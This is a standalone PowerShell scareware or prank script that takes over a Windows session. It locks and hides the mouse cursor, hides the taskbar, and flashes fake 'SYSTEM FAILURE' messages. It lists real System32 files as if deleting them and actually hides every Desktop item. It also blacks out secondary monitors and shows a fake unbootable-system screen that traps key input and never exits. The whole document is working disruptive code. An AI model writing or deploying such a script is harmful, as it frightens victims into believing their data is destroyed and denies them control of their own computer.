# Load necessary libraries
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("user32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    public static extern bool ShowCursor(bool bShow);
    [DllImport("user32.dll")]
    public static extern int FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Constants
$SW_MAXIMIZE = 3

# Get console handle
$consoleHandle = [Native]::GetConsoleWindow()

# Loop fullscreen spam
Start-Job {
    while ($true) {
        [Native]::ShowWindow($consoleHandle, $SW_MAXIMIZE)
        Start-Sleep -Milliseconds 500
    }
}

# Lock mouse + hide cursor
[Native]::ShowCursor($false)
Start-Job {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class MouseLock {
        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);
    }
"@
    while ($true) {
        [MouseLock]::SetCursorPos(0, 0)
        Start-Sleep -Milliseconds 5
    }
}

# Hide taskbar
$taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
[Native]::ShowWindow($taskbar, 0)

# === Flashing Console Phase ===
[console]::CursorVisible = $false
$colors = [Enum]::GetValues([ConsoleColor])
$host.UI.RawUI.WindowTitle = "CRITICAL SYSTEM ERROR"

for ($i = 0; $i -lt 40; $i++) {
    $fg = Get-Random -InputObject $colors
    $bg = Get-Random -InputObject $colors
    while ($fg -eq $bg) { $bg = Get-Random -InputObject $colors }
    $host.UI.RawUI.ForegroundColor = $fg
    $host.UI.RawUI.BackgroundColor = $bg
    Clear-Host
    Write-Host ">>> SYSTEM FAILURE <<<`nOverload detected. Initiating core dump..."
    [console]::Beep((Get-Random -Minimum 400 -Maximum 1000), 100)
    Start-Sleep -Milliseconds 70
}

# === Fake File Deletion ===
Clear-Host
$host.UI.RawUI.ForegroundColor = "DarkRed"
$host.UI.RawUI.BackgroundColor = "Black"
Write-Host "Deleting critical files..." -ForegroundColor Yellow
$files = Get-ChildItem "$env:windir\System32" -File | Get-Random -Count 60
foreach ($f in $files) {
    Write-Host "Deleting C:\Windows\System32\$($f.Name)"
    Start-Sleep -Milliseconds 50
}

# === Hide Desktop Files ===
$desktop = [Environment]::GetFolderPath("Desktop")
Get-ChildItem -Path $desktop -Force | ForEach-Object { attrib +h $_.FullName }

# === Black Fullscreen on All Secondary Monitors ===
$secondaryForms = @()
[System.Windows.Forms.Screen]::AllScreens | Where-Object { -not $_.Primary } | ForEach-Object {
    $black = New-Object Windows.Forms.Form
    $black.FormBorderStyle = 'None'
    $black.StartPosition = 'Manual'
    $black.BackColor = 'Black'
    $black.WindowState = 'Normal'
    $black.Bounds = $_.Bounds
    $black.TopMost = $true
    $black.ShowInTaskbar = $false
    $black.Show()
    $secondaryForms += $black
}

# === Bootloader Fake Screen (Primary Monitor) ===
$form = New-Object Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = 'Black'
$form.ShowInTaskbar = $false
$form.StartPosition = 'Manual'
$form.Bounds = [Windows.Forms.Screen]::PrimaryScreen.Bounds

$label = New-Object Windows.Forms.Label
$label.ForeColor = 'White'
$label.BackColor = 'Black'
$label.Font = New-Object Drawing.Font("Consolas", 14)
$label.Dock = 'Fill'
$label.TextAlign = 'TopLeft'
$label.Text = ""
$form.Controls.Add($label)

function Add-Line {
    param($text, $delay = 400)
    $label.Text += "$text`r`n"
    $form.Refresh()
    Start-Sleep -Milliseconds $delay
}

$form.Show()
Start-Sleep -Milliseconds 500
Add-Line "Microsoft Boot Manager 6.3.9600.16384"
Add-Line "Initializing boot sequence..."
Add-Line "[  OK  ] Verifying memory integrity"
Add-Line "[  OK  ] Checking disk sectors"
Add-Line "[FAILED] Boot partition unreadable"
Add-Line "[FAILED] Recovery subsystem corrupted"
Add-Line "[ERROR] Kernel load failure: STOP 0x0000007B"
Add-Line ""
Add-Line ">>> SYSTEM HALTED <<<"
Add-Line "Press any key to reboot..."

# Trap key input (do nothing)
$form.Add_KeyDown({})

# === Final lock loop ===
while ($true) {
    Start-Sleep -Seconds 1
}
